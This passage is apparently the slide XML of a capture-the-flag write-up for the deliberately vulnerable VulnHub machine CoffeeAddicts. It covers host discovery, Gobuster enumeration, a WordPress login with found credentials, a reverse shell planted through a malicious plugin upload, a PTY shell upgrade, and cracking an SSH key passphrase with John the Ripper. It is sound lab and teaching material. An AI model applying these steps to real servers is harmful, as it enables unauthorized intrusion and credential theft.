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5164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3161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0372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69142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5732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8770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36002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1892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128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8414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49437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9953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21843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3273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46214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9941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51762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F2A03-3FAE-4D31-A2C1-AE298191F619}" type="datetimeFigureOut">
              <a:rPr lang="en-KE" smtClean="0"/>
              <a:t>21/04/2026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F4BF5-E8E6-4C7B-B430-0FBA1359D58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773485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ffee Addicts: 1 ~ VulnHub">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F7D9634-7E73-EFA4-F75A-258CCD57A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2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3173FA-76B6-4612-692B-BFD34F3E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482" y="950976"/>
            <a:ext cx="9499092" cy="12637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i="0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Brewing a Reverse Shell : The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" dirty="0" err="1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CoffeeAddicts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 CTF Challenge </a:t>
            </a:r>
            <a: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 Methodology &amp; Exploitation Path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.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" b="1" i="0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</a:br>
            <a:endParaRPr lang="en-US" sz="3600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333BC-0A48-7358-D38B-A51BCB4A4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3682" y="2367093"/>
            <a:ext cx="9346692" cy="3090732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0B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>What is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>CoffeeAddicts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82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B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>A deliberately vulnerable WordPress machine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B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>Goal: Gain root access and capture the flag(s)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B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>Attack path: Admin access → Reverse shell → User compromise → Root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613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A666E0-D4D8-B73F-D38A-16ABBB51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Host discovery </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>usind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 err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netdiscover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>using the command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo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netdiscover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.1.0/24</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>from the screenshot I identified my target machine to be 192.168.1.174</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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9A40F-2E45-C790-E2FB-66EEBCB73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E7B58D-8B14-8EC6-08B7-01F48DD7C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209" y="9523"/>
            <a:ext cx="8184454" cy="683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89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A4CFD5-44EE-B38A-F3B7-4FE4C283D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287" y="1093787"/>
            <a:ext cx="3617022" cy="469741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  <a:t>Edited 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Menlo"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>etc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Menlo"/>
              </a:rPr>
              <a:t>/hosts</a:t>
            </a:r>
            <a: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  <a:t> to map </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>coffeeaddicts.thm</a:t>
            </a:r>
            <a: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  <a:t> to the target IP, allowing proper DNS resolution and virtual host access through the web browser</a:t>
            </a:r>
            <a:b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1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t># Command used</a:t>
            </a:r>
            <a:b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1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a: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  <a:t> nano /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a: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  <a:t>/hosts</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t># Line added</a:t>
            </a:r>
            <a:b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  <a:t>192.168.1.174  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>coffeeaddicts.thm</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t># Result</a:t>
            </a:r>
            <a:b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  <a:t>http://coffeeaddicts.thm  →  resolves to 192.168.1.174</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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AD0E4-FBF9-E91B-AF60-0EB42E7DB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20322" y="9524"/>
            <a:ext cx="7457378" cy="640715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6021F9-C36D-6440-53E4-468D899A0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683" y="1160463"/>
            <a:ext cx="704780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23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04DEDD-167F-D101-4F6E-A0F4EC94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52400"/>
            <a:ext cx="4240910" cy="60642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Directory </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1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Bruteforcing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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 with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1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Gobuster</a:t>
            </a:r>
            <a:b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400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Gobuster</a:t>
            </a:r>
            <a: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  <a:t> directory enumeration revealed a hidden WordPress installation at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>wordpress</a:t>
            </a:r>
            <a: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  <a:t>, expanding the attack surface beyond the main homepage.</a:t>
            </a:r>
            <a:b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400" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t># Command used</a:t>
            </a:r>
            <a:b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400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gobuster</a:t>
            </a:r>
            <a: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US" sz="1400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a: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  <a:t> -u http://coffeeaddicts.thm –w /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a: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  <a:t>/share/wordlists/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>dirb</a:t>
            </a:r>
            <a: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  <a:t>/common.txt \</a:t>
            </a:r>
            <a:b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  <a:t>  -x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>php,html,txt</a:t>
            </a:r>
            <a:b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400" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t># Critical finding</a:t>
            </a:r>
            <a:b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400" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>http://coffeeaddicts.thm/wordpress/  [301 Redirect]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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413FC-FE3D-DEC2-12F1-5C7E5352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B2A827-B99B-182F-DEF0-1D000EF86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960" y="263525"/>
            <a:ext cx="7147816" cy="633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2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BDF93D-B754-9A3E-7995-AFFC85A2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527051"/>
            <a:ext cx="3563206" cy="5264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 i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This the hidden WordPress installation </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="1400" b="0" i="1" u="none" strike="noStrike" kern="1200" cap="all" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>page revealed by the </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="1400" b="0" i="1" u="none" strike="noStrike" kern="1200" cap="all" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Gobuster</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="1400" b="0" i="1" u="none" strike="noStrike" kern="1200" cap="all" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> directory enumeration </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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AC274-7C79-63A5-8CA0-93C6EE07C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719A00-8302-4064-3065-257CD639E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084" y="149450"/>
            <a:ext cx="6346128" cy="64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EEC5AC-C7AB-5292-A204-BB773A99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91" y="381000"/>
            <a:ext cx="4236406" cy="60356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Accessed WordPress Login Page.</a:t>
            </a:r>
            <a:b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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Accessed the WordPress login page at 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Menlo"/>
              </a:rPr>
              <a:t>wp-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>login.php</a:t>
            </a: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600" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>and successfully authenticated using compromised </a:t>
            </a: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credentials ; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>gus:gusineedyouback</a:t>
            </a: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.</a:t>
            </a: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# Login endpoint</a:t>
            </a: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r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>http://coffeeaddicts.thm/wordpress/wp-login.php</a:t>
            </a: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# Credentials</a:t>
            </a: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Username: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gus</a:t>
            </a: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Password: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>gusineedyouback</a:t>
            </a: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# Result</a:t>
            </a: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✅ Access Granted </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>→ WordPress Admin Dashboard</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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39413-B76E-DE04-9D1D-6EC3663D1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398CB-0095-7FA4-7B01-4326EFACE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89" y="156778"/>
            <a:ext cx="6314286" cy="6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5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D1F00B-7D50-6A58-DBED-A524F2C6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" y="168686"/>
            <a:ext cx="4009134" cy="6436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Malicious Plugin Upload</a:t>
            </a:r>
            <a:b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</a:br>
            <a:b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1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Method:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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WordPress Plugin Uploader (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Menlo"/>
              </a:rPr>
              <a:t>Plugins → Add New → Upload Plugin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)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1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>File Uploaded:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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Menlo"/>
              </a:rPr>
              <a:t>wp-reverse-shell (1).zip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1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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KE" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>✅ "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Plugin installed successfully“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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Using admin privileges, uploaded a malicious ZIP plugin containing reverse shell code, then activated it to establish remote access.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" b="0" i="1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en-US" sz="1600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  <a:t>Attack flow:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:b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1. Navigate to Plugins → Add New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         ↓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2. Click "Upload Plugin" button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         ↓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3. Select wp-reverse-shell (1).zip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         ↓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4. Click "Install Now"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         ↓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5. "Plugin installed successfully"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         ↓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6. Click "Activate Plugin" ← Triggers reverse shell!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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9D3AB-DB0A-5EE6-6E40-68527305D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EBB063-AC5D-AA2D-C5F3-02BBC0396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921" y="168686"/>
            <a:ext cx="7714286" cy="656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D19F00-7C91-B7EB-7811-9D84DCAA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Algerian" panose="04020705040A02060702" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>Established Reverse Shell.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0"/>
            </a:br>
            <a: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  <a:t>Started a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a: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  <a:t> listener on port 1234 and received an incoming reverse shell connection from the target WordPress server.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i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en-US" sz="18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9A3CD-DD97-C155-5EEE-84B5604DB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B2FFF0-5E50-FB76-177A-7FAA4B5C0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333" y="1705202"/>
            <a:ext cx="7495479" cy="299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7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4EFBC28-312C-D4F7-7996-D5476C68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Shell Upgrade with Python PTY</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Used Python's PTY module to spawn an interactive </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/bin/bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> shell, upgrading from the limited reverse shell for better usability.</a:t>
            </a:r>
            <a:b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</a:br>
            <a:b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Command Used</a:t>
            </a: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python3 -c 'import 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pty;pty.spawn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("/bin/bash")’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b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Result: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Upgraded from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/bin/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sh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 to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/bin/bash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 with better interactivity</a:t>
            </a:r>
            <a:b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en-US" sz="36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009EE-E170-8757-9C6C-6A7194043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167A6-A57A-5CA8-53F3-986088FE1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112" y="1122363"/>
            <a:ext cx="6952381" cy="388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15FDA8-EEAB-4FC9-8269-029A735BE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" y="147638"/>
            <a:ext cx="4286947" cy="64484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Encrypted SSH Private Key</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Discovered an encrypted AES-128-CBC protected SSH private key in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>badbyte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/.ssh/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, which can be cracked to gain access as the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>badbyte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> user</a:t>
            </a:r>
            <a:b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Location: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/home/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badbyte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/.ssh/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id_rsa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Key Type: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RSA Private Key (1766 bytes)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Encryption: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AES-128-CBC (indicated by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Proc-Type: 4,ENCRYPTED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)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en-US" sz="16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DE220-9952-7C4A-7BD8-49A1B4F1F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7BB92-2984-FCE5-E13B-BC6BD5C3C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555" y="147638"/>
            <a:ext cx="6347883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4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23A1FC-1602-373A-1CE1-925AC8D8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1" y="14287"/>
            <a:ext cx="4276706" cy="65817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B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Cracked SSH Private Key </a:t>
            </a:r>
            <a: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Passphrase</a:t>
            </a:r>
            <a:b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Tool Used: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John the Ripper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Wordlist</a:t>
            </a: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/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usr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/share/wordlists/rockyou.txt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 (14 million passwords)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Result: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✅ Passphrase cracked as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password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cracking process.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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Step 1: 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Convert SSH key to hash format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ssh2john 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badbyte_key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 &gt; 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badbyte_hash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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Step 2: 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Crack with John the Ripper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john --wordlist=/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usr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/share/wordlists/rockyou.txt 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badbyte_hash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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Step 3: 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Result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password    (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badbyte_key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)</a:t>
            </a:r>
            <a:b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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Used John the Ripper with the rockyou.txt wordlist to crack the encrypted SSH private key passphrase in under one second, revealing the password 'password'.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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2E719-B6B8-FB2B-28B2-5E5B258C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4D4956-F341-17DC-BF01-675A4A1DA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411" y="474662"/>
            <a:ext cx="7500240" cy="585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27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53D784-53AC-A345-2181-BC6CAB579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2" y="152400"/>
            <a:ext cx="4382195" cy="64436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SSH Login as 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badbyte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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 User</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800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1" i="0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Command:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0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 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Menlo"/>
              </a:rPr>
              <a:t>ssh badbyte@192.168.1.174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1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Authentication Method:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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Password (after cracking the SSH key passphrase)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800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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✅ Successfully logged into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>badbyte@CoffeeAdicts</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
            </a:br>
            <a:b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0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Used the cracked passphrase 'password' to authenticate via SSH as the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>badbyte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
